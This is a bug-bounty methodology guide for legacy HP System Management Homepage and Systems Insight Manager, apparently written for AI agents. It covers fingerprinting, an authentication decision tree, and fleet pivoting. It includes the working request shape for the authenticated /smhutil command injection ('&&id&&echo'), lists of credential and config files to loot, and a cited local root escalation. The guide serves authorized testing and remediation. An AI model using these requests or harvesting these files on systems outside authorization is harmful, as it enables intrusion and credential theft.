---
technology: "HP System Management Homepage (SMH) and HP Systems Insight Manager (SIM)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: 1.1 (legacy-hardware-surface TTP supplement)
last-refresh: "2026-11-19"
source: "rewritten from HackTricks (src/network-services-pentesting/pentesting-compaq-hp-insight-manager.md), CC BY-NC 4.0, accessed 2026-11-13; supplement 2026-11-19 adds fingerprint/auth-tree/pivot TTP verified against primary advisories"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary sources. Verified 2026-11-13 against: HP bulletin SSRT061118 rev.1 (seclists bugtraq archive, Feb 2006) for the Namazu lang traversal (SMH 2.0.0–2.1.4 Windows, .namazurc fix) + Nessus 20988; CERT/CC VU#735364 (2013) for the authenticated command injection (ginkgosnmp.inc, /smhutil/snmpchp.php.en MultiViews exec chain, fixed SMH 7.2.2, no CVE listed on the record); NVD one-liners for CVE-2012-2014 / CVE-2012-2016 (SMH < 7.1.1); HPE install/admin docs (via the reference) for port and OS-account semantics. 2026-11-19 supplement (claude-opus-4-8) verified CVE-2013-3576/VU#735364 against Tenable Nessus 70118 (affected < 7.2.2, Au:S, CVSS v2 AV:N/AC:L/Au:S/C:C/I:C/A:C = 9.0, JustGetSNMPQueue/tempfilename→exec), Metasploit exploit/multi/http/hp_sys_mgmt_exec (Linux+Windows), the smhstart local priv-esc (exploit/linux/local/hp_smhstart, SMH ≤ 7.1.2, setuid-root SSL_SHARE_BASE_DIR overflow), HP advisory SSRT4679 (HP HTTP Server anonymous-access, 5.0–5.92, fixed 5.93) and HPE community docs for port/version/SIM-trust semantics. No exploit-module claims executed — reachability framed evidence-only. Companion overview: [[insight-manager|SMH/SIM]]."
---

# SMH/SIM bug bounty methodology

Target model: a legacy ProLiant (Windows/Linux/HP-UX) with SMH on TCP/2301 (HTTP autostart) and TCP/2381 (HTTPS). End states: anonymous page access (information disclosure), host-credential validation (SMH authenticates OS accounts), or — on pre-7.2.2 installs with credentials — command execution via the documented `/smhutil` injection. This is the host-OS agent; for the BMC that people mistake it for, see [[ipmi]].

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| 2301/2381 fingerprint | reachability | yes | SMH version/banner → advisory gating — recon |
| Anonymous/guest mode | optional, per-configuration | yes | health/agent data disclosure — Low/Medium |
| OS-account login | host credentials | no | host cred validation + management pages — High |
| Namazu `lang` traversal | SMH 2.0.0–2.1.4 on Windows | yes | unauthorized file read — High |
| `/smhutil/snmpchp` injection | SMH < 7.2.2 AND authenticated session | no (auth-gated) | command execution as the SMH service context — Critical |

## Phase 1 — fingerprint and port semantics

```bash
nmap -sV -p 2301,2381 TARGET_IP
curl -skI https://TARGET_IP:2381/ | head
curl -si http://TARGET_IP:2301/ | head      # autostart + redirect toward 2381 = live SMH
```

Record the version from the page/banner and the OS family (agent list hints at Windows vs Linux vs HP-UX) — every advisory below is version- and OS-gated. Do not conflate with iLO: iLO does not live on 2301/2381 and does not take OS accounts.

## Phase 2 — authentication model

- Try anonymous/guest access first: some configurations enabled it; if the health pages render without a prompt, that is the finding.
- Otherwise authenticate with host OS accounts (Windows deployments: OS account → SMH privileges per HPE docs). There is **no universal product default password** — do not report one; report weak/reused host credentials validated through SMH.
- A working SMH login is a host-credential confirmation: carry it to SSH/SMB/other services on the same machine within scope.

## Phase 3 — version-gated advisory history

**Directory traversal — bundled Namazu search CGI (SMH 2.0.0–2.1.4, Windows; HP bulletin SSRT061118, 2006).** The `lang` parameter of the bundled `namazu.cgi` search engine failed to validate input, allowing unauthorized file access via traversal. The vendor fix was a one-line `.namazurc` edit — meaning patched-by-workaround hosts exist with the same CGI still present. Trigger shape: a crafted `lang` value with `../` sequences against the search endpoint; verify the file read, do not fire blind on modern versions.

**Command injection — `/smhutil/snmpchp` (SMH before 7.2.2; CERT/CC VU#735364, 2013).** In `ginkgosnmp.inc` (under `/opt/hp/hpsmh/data/smhutil` on Linux, `C:\hp\hpsmh\data\smhutil` on Windows), the last path segment of the request URL reaches an `exec()` call unescaped. Apache MultiViews lets extra path segments reach the script, producing the request shape:

```text
https://TARGET_IP:2381/smhutil/snmpchp/&&whoami&&echo
```

Gating to carry into any report: impact is **remote authenticated** (CVSS AV:N/AC:L/**Au:S**), fixed in SMH 7.2.2+, and `/`, `<`, `>`, `|` are filtered — command chains use `&&`. Fire only after a successful phase-2 login on a version under 7.2.2.

**Unspecified pre-7.1.1 issues (CVE-2012-2014 remote-authenticated unspecified impact; CVE-2012-2016 local information disclosure).** Treat these as version-floor markers for "this install predates the last real audit", not as exploit scripts.

## Phase 4 — local config loot (post-shell)

With local access, hunt these names (locations vary by product version and OS):

```text
path.properties
mx.log
CLIClientConfig.cfg
database.props
pg_hba.conf
jboss-service.xml
.namazurc
```

Why each matters: `path.properties` and `mx.log` map the SMH/SIM install and its operations; `CLIClientConfig.cfg` can carry agent credentials; `database.props`/`pg_hba.conf` expose the embedded database's auth model; `jboss-service.xml` is the old app-server config; `.namazurc` tells you whether the 2006 traversal workaround was ever applied.

## Decision points

- 2381 redirects to a login and 2301 is closed → autostart mode off; work 2381 directly.
- Version banner ≥ 7.2.2 → advisory surface is historical; the finding is credential hygiene and information disclosure.
- Authenticated session + version < 7.2.2 → phase 3 injection is in scope; verify command output, then stop.
- Host credentials work in SMH but nowhere else → check account status; SMH may authenticate against a stale source — still a valid credential oracle finding.

## Tool mapping (in prose)

nmap/curl for fingerprinting; any TLS client for 2381; the host-credential attacks run through your usual validation toolkit (hydra against the login form within authorization, or replay of already-harvested host credentials). A public exploit module does exist for the 2013 injection — Metasploit `exploit/multi/http/hp_sys_mgmt_exec` ("JustGetSNMPQueue Command Injection", Linux+Windows targets) — but it is auth-gated and you should prefer a single hand-sent URL for evidence over an automated module that may fire more than one request. Bug classes: CWE-22 (the 2006 traversal), CWE-77/78 (the 2013 command injection), CWE-284/CWE-522 (anonymous modes and weak host credentials), CWE-200 (agent health-data disclosure).

---

## Supplement — legacy-hardware-surface field guide (added 2026-11-19)

*This is the TTP core for modern engagements where SMH/SIM turns up on an aging ProLiant segment. The product's last real security audit predates most of today's programs, so the finding is rarely a fresh CVE — it is **fingerprint precision, an auth decision tree, and a pivot map** that turn "old management page" into a scoped, defensible report. Every technique below is single-request and evidence-first; the injection path is framed reachability-only. Sources at the end.*

The product priority for this surface is not the CVE list — it is the craft of proving what the box is, what it will let you do without credentials, and what it can see across the fleet:

| Priority | Objective | Technique | Payoff |
|---|---|---|---|
| 1 | Prove it is SMH-on-host, not a BMC | 2301/2381 + agent-list fingerprint, iLO cross-check | correct triage; avoids a wrong-surface report |
| 2 | Pin version **and** OS flavor | banner/page build string, agent set, cert CN | gates every advisory below; most reports stop here |
| 3 | Walk the auth decision tree | anonymous probe → OS-account validation → own-store | pre-auth disclosure or a host-credential oracle |
| 4 | Establish injection reachability (evidence only) | version < 7.2.2 AND authenticated session | Critical **if** both gates hold — do not fire blind |
| 5 | Map the SIM pivot | is this a managed node or the CMS? | CMS = fleet-wide lateral intel |
| 6 | Frame severity for a modern program | isolated-management-network argument, decommission ask | a report that survives triage |

### S1 — Fingerprint precision: version markers per OS flavor

The single most common mistake on this surface is reporting a version-gated CVE against a build that is not actually in range, or against an OS the advisory never covered. Three facts to pin before anything else — **version, OS family, and port mode** — because the 2006 traversal is Windows-only and the 2013 injection has Linux/Windows path differences.

**2301 vs 2381 semantics.** 2301 is the HTTP entry; 2381 is HTTPS. These are not two independent services — 2301 is a courtesy redirect toward 2381 where the real UI lives. What the pair tells you depends on OS:

```bash
nmap -sV -p 2301,2381 198.51.100.10
curl -si  http://198.51.100.10:2301/  | sed -n '1,15p'   # expect 301/302 toward :2381
curl -skI https://198.51.100.10:2381/ | sed -n '1,15p'   # the live UI; read Server + any version header
```

- **Windows:** SMH binds 2301 **and** 2381 on every configured NIC; both ports open and persistent is the Windows tell. The service runs in a Windows service context (often SYSTEM-adjacent), which is why the injection's command context is more interesting here.
- **Linux:** typically both ports live, SMH served by its own bundled Apache (`hpsmhd`). Paths live under `/opt/hp/hpsmh/`.
- **HP-UX:** autostart is lazy — a daemon holds **2301** and only *spins up* SMH on **2381 on demand**, then stops it again after an idle timeout (`smhstartconfig` controls this). So on HP-UX you may see 2301 open and 2381 *intermittently* closed; a closed 2381 is not "no SMH" — re-probe 2381 immediately after touching 2301 to wake it. This timing behavior is itself an HP-UX fingerprint.

**Reading the version — and why the number lies.** The build string renders in the SMH page (historically bottom-left, e.g. `2.0.1.104`, `7.2.5.3`). Grab it without a login:

```bash
curl -sk https://198.51.100.10:2381/ | grep -oiE 'version[^<]*[0-9]+\.[0-9]+\.[0-9]+(\.[0-9]+)?' | head
# cross-check the TLS cert — CN/OU sometimes carry the hostname and a build hint
echo | openssl s_client -connect 198.51.100.10:2381 2>/dev/null | openssl x509 -noout -subject -issuer
```

Two traps baked into HP's own numbering:

- **Build numbers are not monotonic across OS.** HP shipped per-OS trains, and a *newer* release for one OS can carry a *lower* dotted number than an older release for another. Never infer "patched" from "higher number" — map the exact build to the per-OS advisory, not to a mental ordering. `7.2.2` is the one hard floor that matters (the injection fix); treat everything below it as in-range for S3 and everything at/above as historical.
- **Pre-2.0 port hijack.** Before SMH 2.0, individual HP web agents each carried their own SMH copy and the newest among them seized 2301/2381 — so a very old box can present a version that belongs to one agent while others lag. On these, enumerate the agent list (the UI's device/agent inventory) rather than trusting one banner.

**2301 vs 2381 is also a config signal.** If 2381 serves a login and 2301 is closed, autostart/redirect is off and someone hardened it partially. If 2301 redirects cleanly and the UI renders health data with no prompt, you are likely looking at anonymous mode (S2) — the highest-value pre-auth outcome.

### S2 — The authentication decision tree

SMH authenticates in more than one way depending on version, OS, and configuration. Walking this tree in order is what separates a real pre-auth finding from a wasted login attempt. **Do not brute-force before you have walked it** — anonymous mode or OS pass-through may hand you the data with no credentials at all.

```
1. GET https://host:2381/  (no creds)
   ├─ health/agent pages render, no prompt ........ ANONYMOUS MODE  → S2a (disclosure finding, done)
   └─ redirected/forced to a login form ........... go to 2
2. Submit a host OS account (local or domain)
   ├─ accepted ................................... SMH validates against the HOST OS  → S2b (credential oracle)
   └─ rejected with "local only" / cert error .... go to 3
3. Behavior checks
   ├─ "login only over HTTPS" ................... you hit 2301 directly; use 2381
   ├─ account works in SMH but nowhere else ..... SMH may authenticate a STALE/own store  → S2c
   └─ all rejected .............................. version/CVE surface only (S3), no cred path
```

**S2a — Anonymous mode variants.** Anonymous access is **disabled by default** and HP explicitly discourages it, but it is a checkbox (Settings → HTTP Server → Options on classic builds) and plenty of fleets flipped it for a monitoring tool that never got locked back down. There is also the older *HP HTTP Server* anonymous-access flaw (advisory SSRT4679, HP HTTP Server 5.0–5.92, fixed 5.93) where anonymous was reachable even where the admin believed it off — so test the behavior, do not trust the config claim. The finding when anonymous renders: agent health, firmware/driver inventory, NIC/storage topology, sometimes usernames — CWE-200, typically Low/Medium alone but a **recon multiplier** for the rest of the segment.

```bash
# Anonymous probe — one GET each, diff against a known-login-required SMH
for p in / "hpsmh/" "cpqlogin.php?RedirectUrl=/" "smhutil/" ; do
  curl -sk -o /dev/null -w "%{http_code} %{size_download}B  $p\n" "https://198.51.100.10:2381/$p"
done
# A 200 with a multi-KB body on the health pages (not the login page) = anonymous disclosure
```

**S2b — OS-account pass-through.** When SMH validates against the host OS, a successful SMH login is a *proof of host credentials*, not merely app access. On Windows deployments this is local-or-domain account pass-through with SMH privilege levels (Administrator/Operator/User) mapped from group membership. Treat a working SMH login as a validated credential you carry — within scope — to SSH, SMB, WinRM, RDP ([[rdp]]) on the same host. This is the highest-leverage legitimate outcome: you have not exploited anything, you have *demonstrated a reusable host credential*, which triages cleanly.

**S2c — when SMH validates its own store.** Some versions/configs keep an SMH-local account list or validate against a source that has drifted from the live OS accounts. The tell: credentials that authenticate to SMH but fail on SSH/SMB/WinRM for the same name. This is still a valid finding — a management interface honoring stale or independent credentials is a credential-oracle and lifecycle problem — but frame it as *SMH-local*, not as host compromise, or a triager will (correctly) bounce the escalation claim. Note which account status (disabled-on-OS-but-live-in-SMH) you observed; that is the reportable gap.

**Discipline:** one credential set, a handful of attempts, logged. No spraying the OS login form at volume — that trips host lockout policy and is destructive on a production management plane. Prefer replaying credentials you were given or already validated elsewhere in scope.

### S3 — /smhutil command-injection reachability (evidence-only)

This is the crown jewel on pre-7.2.2 boxes, and the one place discipline matters most: it is **remote *authenticated*** (Au:S) and **version-gated (< 7.2.2)**. Confirm *both* gates before you touch it, and when you do, send one request that proves command execution with a benign command — never a payload that changes state.

The flaw (CVE-2013-3576 / CERT VU#735364, Markus Wulftange): in `ginkgosnmp.inc`, the `JustGetSNMPQueue` function builds a `tempfilename` from the trailing segment of the request path and passes it to an `exec()` call unescaped. Apache **MultiViews** on the SMH vhost lets extra path segments ride through to `snmpchp.php.en`, so the attacker-controlled segment reaches the shell. Paths differ by OS:

- Linux: `/opt/hp/hpsmh/data/smhutil/`
- Windows: `C:\hp\hpsmh\data\smhutil\`

Request shape (the trailing segment after the script is the injected command context):

```text
https://198.51.100.10:2381/smhutil/snmpchp.php.en/&&id&&echo
```

Reachability gates to record in the report, in order:

1. **Authenticated session present** (from S2b/S2c). Without a valid session the path returns auth failure — this is not a pre-auth bug; reporting it as one gets it closed.
2. **Version < 7.2.2** (from S1), matched to the OS train. 7.2.2+ is patched; stop.
3. **Metacharacter filtering:** `/`, `<`, `>`, `|` are filtered — command *chaining* uses `&&`. Build your proof-of-execution around `&&` (e.g. `&&id&&echo` on Linux, `&&whoami&&echo` on Windows), not pipes or redirects.
4. **Command context:** on Windows this is the SMH service account (often highly privileged); on Linux it is the `hpsmh` Apache service user. Capture the `id`/`whoami` output verbatim — that single line *is* the PoC. Do not escalate, write files, or pivot from inside the report scope without separate authorization.

CVSS v2 for the report: `AV:N/AC:L/Au:S/C:C/I:C/A:C` = 9.0 (Critical). The Metasploit module `exploit/multi/http/hp_sys_mgmt_exec` automates this against Linux and Windows, but a hand-sent URL with a benign command is the cleaner, lower-volume evidence — prefer it.

> **CTF vs bounty here:** in a CTF these boxes are a *known* path — you fire the module or the URL and move to the shell. In a bounty you must prove *both gates* and stop at `id`; firing the full module (which may drop a payload) exceeds "evidence-first" and can breach rules of engagement. Same vuln, opposite stopping point.

### S4 — Agent-vs-BMC triage discipline

The most expensive confusion on HP legacy hardware is conflating **SMH (a host-OS agent)** with **iLO (the baseboard management controller / lights-out processor)**. They are different trust domains and different reports:

| Property | SMH / SIM | iLO (BMC) — see [[ipmi]] |
|---|---|---|
| Runs on | the host OS (Windows/Linux/HP-UX) | separate always-on management processor |
| Ports | 2301 (HTTP→redirect), 2381 (HTTPS) | 443/80 (iLO web), 623/udp (IPMI), 17988/17990 |
| Auth source | host OS accounts or SMH store | iLO's own user database |
| Powered off host? | **dead** — it is a host service | **alive** — BMC runs on standby power |
| Classic bug class | this document (CVE-2013-3576, traversal) | IPMI `cipher 0`, 2.0 RAKP hash leak (CVE-2013-4786), iLO4 `Connection: AHp` auth bypass (CVE-2017-12542) |

Triage rule: **2301/2381 and OS-account acceptance = SMH; 623/udp or an iLO login page = BMC.** If `nmap` shows both, you have two separate surfaces on one chassis — report them as two findings with two trust models. The IPMI/iLO methodology lives in [[ipmi]]; do not copy its RAKP/cipher-0 techniques onto SMH (they do not apply) and do not report SMH's injection against an iLO (wrong product). The fast disambiguator: iLO never accepts a host OS account and survives a host power-off; SMH does the opposite.

### S5 — SIM central-server pivot surface

HP Systems Insight Manager (SIM) is the **Central Management Server (CMS)** that manages many SMH agents across a fleet. Landing on a *managed node* (one SMH) is a single host; landing on the *CMS* is fleet-wide intelligence and potentially fleet-wide credential reach. Distinguish them early:

- **Managed node:** SMH only; its UI shows this host's health, no inventory of *other* servers.
- **CMS:** SIM UI (often the same 2381, plus SIM's own web app) listing many discovered systems, an "All Systems" inventory, discovery tasks, and credential stores.

Why the CMS is the prize, and what to enumerate (read-only, within scope):

- **Credential stores by type, each with a different blast radius.** SIM keeps *separate* credential sets: **SNMP community strings** (status-poll the agents — a leaked community string is read across every polled node), **WBEM/WMI credentials** (richer management, often a domain service account), and **sign-in credentials** (used to log into the CMS and managed nodes to run tools/tasks — the highest-value set). Trust relationships are *separate* from credentials: a CMS can be "trusted" by an agent without that proving which credential set reaches it.
- **The fleet inventory is lateral-movement intel** even before any credential: hostnames, OS versions, iLO addresses, and which boxes are unpatched SMH (your S3 candidate list, handed to you). Export nothing beyond what a finding needs.
- **Trust pivots.** SIM establishes CMS→agent trust via certificate ("Configure or Repair Agents" pushes it). A CMS that can run tasks on managed nodes is, by design, a remote-execution hub — if you have CMS admin, note the *as-designed* reach rather than exploiting it, because the design is the risk.

Report framing: compromise of a CMS is not "one server" — it is "the management plane for N servers," and severity scales with N. That sentence is what makes a legacy-surface SIM finding land as High/Critical rather than Low.

### S6 — Post-access: local priv-esc and loot (CTF-relevant)

If S3 yields a shell as the `hpsmh`/service user on Linux and the box is **SMH ≤ 7.1.2**, there is a documented local escalation: the setuid-root `smhstart` binary has a buffer overflow in the `SSL_SHARE_BASE_DIR` environment variable (Metasploit `exploit/linux/local/hp_smhstart`, disclosed 2013-03-30, agix). Service-user → root in one hop. This is the classic CTF finish on these boxes; in a bounty, a root-via-local-overflow step needs explicit authorization to run and should be *demonstrated minimally*, not weaponized.

Config loot to pull once you have local read (names vary by version/OS — Phase 4 lists the primary set; these extend it):

```text
/opt/hp/hpsmh/conf/                 # smhpd.xml, access/anon settings, trust config (Linux)
C:\hp\hpsmh\conf\                   # same, Windows
smhpd.xml                           # SMH daemon config — anonymous + IP-restriction state
*.0 / *.pem under hpsmh             # SMH service certs
CLIClientConfig.cfg                 # SIM CLI agent credentials (if this is near a CMS)
globalsettings.props / database.props  # SIM CMS DB connection (on the CMS)
```

`smhpd.xml` tells you definitively whether anonymous mode and IP restrictions were set — closing the loop on your S2a observation with ground truth for the report.

### S7 — Severity framing for legacy surface in modern programs

A real-world program triager will reflexively reach for two deflections on a legacy-management finding. Pre-empt both in the report:

- **"It's on an isolated management network."** Verify the claim rather than conceding it. From your vantage point, can you reach 2381 at all? If you reached it from the general corporate segment (not a jump host on a dedicated OOB VLAN), the isolation claim is already false and you should say so with the source IP/segment you tested from. If it *is* isolated, scope the finding honestly to "reachable by anyone on the management VLAN" — still meaningful for insider/lateral models, and say so.
- **"That product is end-of-life / unsupported."** EOL is the argument *for* the finding, not against it: no patches are coming, so the only remediations are decommission or network isolation. State that explicitly.

Severity anchors: anonymous disclosure alone — Low/Medium (CWE-200); host-credential oracle via SMH — Medium/High depending on reuse; authenticated injection on < 7.2.2 — Critical (9.0) but gated on the auth precondition, so state the precondition prominently; CMS compromise — scales with fleet size. Always map to the program's own rubric and lead with impact, not the CVE number.

### S8 — Decommission / remediation (report close)

Because the product line is effectively frozen, remediation is lifecycle, not patch — give the defender a concrete path:

1. **Decommission SMH/SIM** where the hardware is being retired anyway; it is the cleanest fix.
2. If the agent must stay: **upgrade to 7.2.2+** (closes the injection), **disable anonymous access** (confirm in `smhpd.xml`, not just the UI), and **set IP restrictions** to the known management stations only.
3. **Isolate 2301/2381 to a dedicated OOB management VLAN** reachable only via a jump host — the control that makes the residual legacy risk acceptable.
4. **Rotate any SNMP community strings and WBEM/sign-in credentials** a CMS exposure touched; these reach the whole fleet, so rotation scope = every polled node.
5. **Separate the host-credential story from the SMH story** in the fix: if SMH was a credential oracle, the underlying fix is host credential hygiene, not just the management page.

### S9 — CTF notes

Where these boxes appear and how the lens differs from a bounty:

- **Pattern recognition:** 2301/2381 open on an nmap of a "corporate/legacy" themed box is the SMH tell; follow it to the SMH version in the page and match to CVE-2013-3576. On Linux the intended chain is frequently *authenticated injection → `hpsmh` shell → `smhstart` SSL_SHARE_BASE_DIR overflow → root*, a self-contained two-step that rewards knowing the product.
- **Credentials are usually "intended":** CTF boxes seed working creds (or anonymous mode) deliberately — the auth decision tree (S2) is a checklist you walk fast, not a wall. In a bounty the same tree is where most of the actual work and the actual findings are.
- **Stopping point is the whole difference:** CTF rewards full exploitation (module → shell → root → flag). A bounty rewards *proof with the smallest footprint* — `id` output, two gates documented, no state change, no root-via-overflow unless authorized. The identical vulnerability produces opposite behavior; internalize the switch so you do not CTF-reflex on a live program.
- **Don't over-fit to SMH:** the same chassis often exposes iLO ([[ipmi]]); a CTF may intend the iLO path (cipher-0, RAKP, or iLO4 auth bypass) and SMH is the decoy, or vice-versa. Fingerprint both and pick the live one.

### S10 — A worked pass, end to end

Tying S1–S3 together on one authorized host (`198.51.100.10`, in scope). The point is the *sequence of decisions*, each gated by the previous output.

```bash
# 1. Is it SMH, and what OS/port mode?
nmap -sV -p 2301,2381 198.51.100.10
# -> 2301/tcp open  http   (redirect)      2381/tcp open  ssl/http  hpsmhd
#    both open + hpsmhd banner => Linux SMH (bundled Apache). Note it.

curl -sk https://198.51.100.10:2381/ | grep -oiE 'version[^<]*[0-9]+(\.[0-9]+){2,3}' | head -1
# -> Version 7.1.1    => BELOW 7.2.2. Injection in range IF we get a session (gate 2 of 2 provisional).

# 2. Walk the auth tree — anonymous first.
curl -sk -o /dev/null -w "%{http_code} %{size_download}B\n" https://198.51.100.10:2381/
# -> 200 420B   (small body = login page, not anonymous). Not anonymous; need creds.

# 3. OS-account validation? Replay an in-scope credential already validated on SSH.
#    (single attempt, logged — not a spray)
#    Login succeeds in the SMH UI => SMH validates the host OS account (S2b).
#    That alone is a reportable host-credential confirmation.

# 4. Both gates now hold: authenticated session + version 7.1.1 (< 7.2.2).
#    One benign proof-of-execution request, && chaining, no state change:
curl -sk --cookie "$SMH_SESSION_COOKIE" \
  "https://198.51.100.10:2381/smhutil/snmpchp.php.en/&&id&&echo"
# -> capture any 'uid=NNN(hpsmh) ...' line in the response body. THAT line is the PoC.
#    Stop. Do not escalate, write, or pivot without separate authorization.
```

Decision trace for the report: *redirecting 2301 + hpsmhd on 2381 → Linux SMH; page build 7.1.1 → sub-7.2.2; login form (not anonymous) → OS-account accepted = host-credential oracle; authenticated + sub-7.2.2 → injection reachable, proven with `id`, no state change.* Each arrow is a gate you can defend.

### S11 — Coverage closeout (falsifiable claims)

Frame coverage as claims you tried to *disprove*, and record the boundary you did not cross so any residual-risk line stays honest.

| Claim you tried to prove | Rejected (secure) if | Where |
|---|---|---|
| The management page is reachable without credentials | login is forced on 2381 and anonymous renders nothing | S2a |
| SMH hands back a working host credential | every in-scope host account is rejected by SMH | S2b |
| SMH honors a credential the host OS no longer does | SMH login matches live OS account status exactly | S2c |
| The host OS command context is reachable via /smhutil | version ≥ 7.2.2, or no authenticated session exists | S3 |
| This node sees the rest of the fleet | the UI inventories only this host (managed node, not CMS) | S5 |
| The surface is reachable off the management VLAN | 2381 answers only from a dedicated OOB segment/jump host | S7 |

The claim you can rarely close from the outside: whether the box is *actually* on an isolated management network. Name it as a property to verify with the customer (from which segment did you reach 2381?), not an assumption to concede.

### Supplement references

- CERT/CC VU#735364 — HP SMH command injection — https://kb.cert.org/vuls/id/735364
- NVD CVE-2013-3576 — https://nvd.nist.gov/vuln/detail/CVE-2013-3576
- Tenable Nessus plugin 70118 (SMH < 7.2.2, Au:S, CVSS v2 9.0) — https://www.tenable.com/plugins/nessus/70118
- Metasploit exploit/multi/http/hp_sys_mgmt_exec (JustGetSNMPQueue / tempfilename→exec) — https://www.rapid7.com/db/modules/exploit/multi/http/hp_sys_mgmt_exec/
- Metasploit exploit/linux/local/hp_smhstart (SMH ≤ 7.1.2, setuid-root SSL_SHARE_BASE_DIR overflow) — https://www.rapid7.com/db/modules/exploit/linux/local/hp_smhstart/
- HP advisory SSRT4679 — HP HTTP Server anonymous access (5.0–5.92, fixed 5.93) — https://ftpmirror2.infania.net/sites/ftp.compaq.com/pub/products/servers/management/security-advisory/SSRT4679.pdf
- HPE community — SMH ports 2301/2381, HP-UX autostart, per-OS build numbering — https://community.hpe.com/t5/server-management-systems/
- HPE community — SIM CMS trust vs. SNMP/WBEM/sign-in credential types — https://community.hpe.com/t5/server-management-systems/cms-trust-information/m-p/3862878

*Supplement added 2026-11-19 by claude-opus-4-8. Verified against CERT/CC VU#735364, NVD/Tenable for CVE-2013-3576 (SMH < 7.2.2, remote-authenticated, CVSS v2 9.0), the two Metasploit modules named above, HP advisory SSRT4679, and HPE community documentation for port/version/SIM-trust semantics. Reachability for the /smhutil injection is framed evidence-only (both gates — authenticated session and version < 7.2.2 — required). Legacy-hardware-surface TTP focus per the 2026-11-19 content-priority override: fingerprint precision, the authentication decision tree, agent-vs-BMC triage, and the SIM central-server pivot are the product; older CVEs are capped to historical context.*
